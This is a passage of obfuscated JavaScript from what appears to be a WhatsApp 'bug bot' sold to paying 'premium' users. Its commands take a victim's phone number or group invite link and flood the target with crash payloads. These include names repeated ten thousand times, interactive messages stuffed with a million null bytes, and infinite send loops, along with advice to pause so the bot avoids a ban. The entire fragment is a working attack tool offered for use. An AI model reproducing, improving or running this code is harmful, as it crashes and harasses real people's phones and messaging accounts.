          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x525ba8 = 0x0; _0x525ba8 < 0x1e; _0x525ba8++) {
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
            await _0x4b4561(_0xff3d66, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x24daca + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case '⭐':
      case '⚡':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x48ee93 = q.replace(/[^0-9]/g, '');
          if (_0x48ee93.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1eafe7 = _0x48ee93 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x576569 = 0x0; _0x576569 < 0xa; _0x576569++) {
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
            await _0x4b4561(_0x1eafe7, _0x600e6e);
            await _0x463f63(_0x1eafe7, _0x4d43fb);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x48ee93 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "bug-list":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x376a57 = 0x0; _0x376a57 < amount; _0x376a57++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
        break;
      case "bug-list":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x41718a = 0x0; _0x41718a < amount; _0x41718a++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-external":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x2d057b = 0x0; _0x2d057b < amount; _0x2d057b++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-internal":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + '@s.whatsapp.net';
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x39abb6 = 0x0; _0x39abb6 < amount; _0x39abb6++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-engine":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0xae8d1f = 0x0; _0xae8d1f < amount; _0xae8d1f++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
        break;
      case "buglist-crash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + '@s.whatsapp.net';
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x41c125 = 0x0; _0x41c125 < amount; _0x41c125++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
        break;
      case "delta1":
      case 'dark':
      case '💀':
      case "satan":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4e665f = q.replace(/[^0-9]/g, '');
          if (_0x4e665f.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1074b4 = _0x4e665f + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x58696b = 0x0; _0x58696b < 0x1; _0x58696b++) {
            await _0x216f83(_0x1074b4, _0x4d43fb);
            await _0x4b4561(_0x1074b4, _0x600e6e);
            await _0x463f63(_0x1074b4, _0x4d43fb);
            await _0x4b4561(_0x1074b4, _0x600e6e);
            await _0x156efb(_0x1074b4, _0x3facec);
            await _0x4b4561(_0x1074b4, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x4e665f + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "wtf":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x2acf24 = q.replace(/[^0-9]/g, '');
          if (_0x2acf24.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x59499b = _0x2acf24 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x4cfb44 = 0x0; _0x4cfb44 < 0x1; _0x4cfb44++) {
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x216f83(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x463f63(_0x59499b, _0x4d43fb);
            await _0x4b4561(_0x59499b, _0x600e6e);
            await _0x156efb(_0x59499b, _0x3facec);
            await _0x4b4561(_0x59499b, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x2acf24 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "metaverse":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x12edcf = q.replace(/[^0-9]/g, '');
          if (_0x12edcf.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x179241 = _0x12edcf + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x3d6dc5 = 0x0; _0x3d6dc5 < 0x1; _0x3d6dc5++) {
            await _0x216f83(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x1c844b(_0x179241, _0x233a41);
            await _0x1606bb(_0x179241, _0x157e42);
            await _0x11fb06(_0x179241, _0x233a41);
            await _0x1606bb(_0x179241, _0x157e42);
            await _0x7b8e21(_0x179241, _0x44d4d0);
            await _0x1606bb(_0x179241, _0x157e42);
            await _0x1c844b(_0x179241, _0x233a41);
            await _0x1606bb(_0x179241, _0x157e42);
            await _0x11fb06(_0x179241, _0x233a41);
            await _0x1606bb(_0x179241, _0x157e42);
            await _0x7b8e21(_0x179241, _0x44d4d0);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x463f63(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x156efb(_0x179241, _0x3facec);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x216f83(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x463f63(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x156efb(_0x179241, _0x3facec);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x216f83(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x28a511(_0x179241);
            await _0x28a511(_0x179241);
            await _0x156efb(_0x179241, _0x3facec);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x216f83(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x28a511(_0x179241);
            await _0x463f63(_0x179241, _0x4d43fb);
            await _0x4b4561(_0x179241, _0x600e6e);
            await _0x156efb(_0x179241, _0x3facec);
            await _0x4b4561(_0x179241, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x12edcf + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "unlimited-bug":
      case '😈':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4849f4 = q.replace(/[^0-9]/g, '');
          if (_0x4849f4.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x10c174 = _0x4849f4 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (;;) {
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x216f83(_0x10c174, _0x4d43fb);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x216f83(_0x10c174, _0x4d43fb);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x216f83(_0x10c174, _0x4d43fb);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await _0x216f83(_0x10c174, _0x4d43fb);
            await _0x4b4561(_0x10c174, _0x600e6e);
            await sleep(0x7530);
          }
        }
        break;
      case 'lockbit':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x44bc2a.quoted) {
            return _0x5d98d9("Example usage: " + (_0x1eabdf + _0x19c9fe) + " reply chat");
          }
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'text': "Success In Sending Bug",
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363622395675672@newsletter",
                'newsletterName': "𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒".repeat(0x2710),
                'serverMessageId': 0x2
              }
            }
          }, {
            'quoted': xbug2
          });
          await sleep(0x7d0);
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'react': {
              'text': '🐛',
              'key': {
                'remoteJid': _0x44bc2a.chat,
                'fromMe': true,
                'id': _0x443106.id
              }
            }
          });
        }
        break;
      case "vivo-react":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x44bc2a.quoted) {
            return _0x5d98d9("Example usage: " + (_0x1eabdf + _0x19c9fe) + " reply chat");
          }
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'text': "Success In Sending Bug",
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363622395675672@newsletter",
                'newsletterName': "𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒".repeat(0x2710),
                'serverMessageId': 0x2
              }
            }
          }, {
            'quoted': xbug2
          });
          await sleep(0x7d0);
          await _0x38dbed.sendMessage(_0x44bc2a.chat, {
            'react': {
              'text': '🐛',
              'key': {
                'remoteJid': _0x44bc2a.chat,
                'fromMe': true,
                'id': _0x443106.id
              }
            }
          });
        }
        break;
      case "satanic":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + '@s.whatsapp.net';
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x4d622d = 0x0; _0x4d622d < amount; _0x4d622d++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
      case "vivo-list":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example:\n" + (_0x1eabdf + _0x19c9fe) + " 62xxxxxxxxx|5");
          }
          victim = _0x1b3c99.split('|')[0x0] + "@s.whatsapp.net";
          amount = _0x1b3c99.split('|')[0x1] * 0x1e;
          for (let _0x4570d9 = 0x0; _0x4570d9 < amount; _0x4570d9++) {
            await _0x38dbed.sendMessage(victim, {
              'text': ''
            }, {
              'quoted': xbug2
            });
          }
          _0x5d98d9("Successfully Sent Bug To " + victim);
        }
      case 'phone-crash':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1175df = q.replace(/[^0-9]/g, '');
          if (_0x1175df.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x403029 = _0x1175df + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (;;) {
            await _0x4b4561(_0x403029, _0x4d43fb);
          }
        }
        break;
      case "ios-unlimited":
      case "infinity-war":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x44a827 = q.replace(/[^0-9]/g, '');
          if (_0x44a827.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          await _0x5d98d9("_</> successfully send bug to target_");
          let _0x55f9b2 = _0x44a827 + "@s.whatsapp.net";
          for (;;) {
            await _0x28a511(_0x55f9b2);
            await sleep(0x4b0);
          }
        }
        break;
      case 'infinity-warcrash':
      case "infinity-good":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789|1\n# memasukkan 1 sama dengan 300.detik");
          }
          let _0xb2ea9b = q.split('|')[0x0];
          let _0xfd702f = _0xb2ea9b.replace(/[^0-9]/g, '');
          if (_0xfd702f.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789|1");
          }
          let _0x7385f5 = _0xfd702f + "@s.whatsapp.net";
          let _0x57fec8 = q.split('|')[0x1] * 0xc8;
          let _0x3966c9 = _0x57fec8 * 1.5;
          _0x44bc2a.reply(_0x3966c9 + " detik");
          _0x5d98d9("_</> successfully send bug to target_");
          for (let _0xe44d63 = 0x0; _0xe44d63 < _0x57fec8; _0xe44d63++) {
            await _0x28a511(_0x7385f5);
            await sleep(0x5dc);
          }
          _0x5d98d9("👤 Succes Send Bug Ke " + _0x7385f5 + " dalam kurun waktu " + _0x3966c9 + " detik");
        }
        break;
      case 'bug-button':
      case 'bug-worm':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " https://chat.whatsapp.com/");
          }
          _0x5d98d9("_</> successfully send bug to target_");
          let _0x24140a = _0x1f3af4[0x0].split('https://chat.whatsapp.com/')[0x1];
          let _0xf1164e = await _0x38dbed.groupAcceptInvite(_0x24140a);
          for (let _0x5cab84 = 0x0; _0x5cab84 < 0x5; _0x5cab84++) {
            var _0x477bf6 = generateWAMessageFromContent(_0x44bc2a.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': 'cta_url',
                        'buttonParamsJson': "{ display_text : '⿻𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x44bc2a.chat,
              'quoted': _0x4d43fb
            });
            await _0x38dbed.relayMessage(_0xf1164e, _0x477bf6.message, {
              'messageId': _0x477bf6.key.id
            });
            await sleep(0x2bc);
          }
          _0x5d98d9("<✓> Successfully Send Bug to " + _0xf1164e + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "button-internal":
      case "button-external":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " https://chat.whatsapp.com/");
          }
          _0x5d98d9("_</> successfully send bug to target_");
          let _0x8f5c1d = _0x1f3af4[0x0].split("https://chat.whatsapp.com/")[0x1];
          let _0x3cac75 = await _0x38dbed.groupAcceptInvite(_0x8f5c1d);
          for (let _0x52069c = 0x0; _0x52069c < 0x5; _0x52069c++) {
            var _0x477bf6 = generateWAMessageFromContent(_0x44bc2a.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': 'cta_url',
                        'buttonParamsJson': "{ display_text : '⿻𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒⿻', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x44bc2a.chat,
              'quoted': _0x4d43fb
            });
            await _0x38dbed.relayMessage(_0x3cac75, _0x477bf6.message, {
              'messageId': _0x477bf6.key.id
            });
            await sleep(0x2bc);
          }
          _0x5d98d9("<✓> Successfully Send Bug to " + _0x3cac75 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "enemygroup":
      case "bug-hole":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 1962623836281@g.us");
          }
          _0x5d98d9("_</> successfully send bug to target_");
          target = q;
          for (let _0x37b716 = 0x0; _0x37b716 < 0x5; _0x37b716++) {
            var _0x477bf6 = generateWAMessageFromContent(_0x44bc2a.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      'title': '',
                      'subtitle': " "
                    },
                    'body': {
                      'text': "🩸⃟༑⌁⃰𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
                    },
                    'footer': {
                      'text': "›          #𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "cta_url",
                        'buttonParamsJson': "{ display_text : '⿻𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒', url : , merchant_url :  }"
                      }],
                      'messageParamsJson': "\0".repeat(0xf4240)
                    }
                  }
                }
              }
            }), {
              'userJid': _0x44bc2a.chat,
              'quoted': _0x4d43fb
            });
            await _0x38dbed.relayMessage(target, _0x477bf6.message, {
              'messageId': _0x477bf6.key.id
            });
            await sleep(0x2bc);
          }
